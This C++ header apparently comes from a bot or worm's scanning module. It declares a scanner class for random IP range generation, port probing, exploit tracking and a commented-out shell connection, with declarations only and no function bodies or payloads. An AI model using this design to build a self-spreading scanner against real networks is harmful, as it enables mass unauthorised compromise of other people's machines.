#ifndef NO_ADVSCAN

class CScanner : public CThread {
public:
	static CScanner main;
	virtual void *Run();
	void Init();

	static void AdvPortScanner();
	static void AdvScanner();
	
	string InternalIp();

//	BOOL ConnectShell(EXINFO exinfo, unsigned int connectport);
	void ListExploitStats(BOOL verbose, int total);
	void CurrentIP();
	BOOL AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay);
	char *MakeIP(char *ip,BOOL Random,int Class);
	void CheckServers(ADVSCAN scan);
	string AdvGetNextIP(string seqIp);
	string AdvGetNextIPRandom(string scanIp);

//	ADVINFO advinfo[300];
	ADVSCAN scan;

	string sLocalHost;
	string sExternalHost;
	bool bRunning;
	string scanType;
	string scanRange;
	string scanDuration;
	string scanExploit;
	int scanDelay;
	int scanThreads;
	unsigned int scanPort;
};

BOOL PrivateIP(const char *ip);
#endif

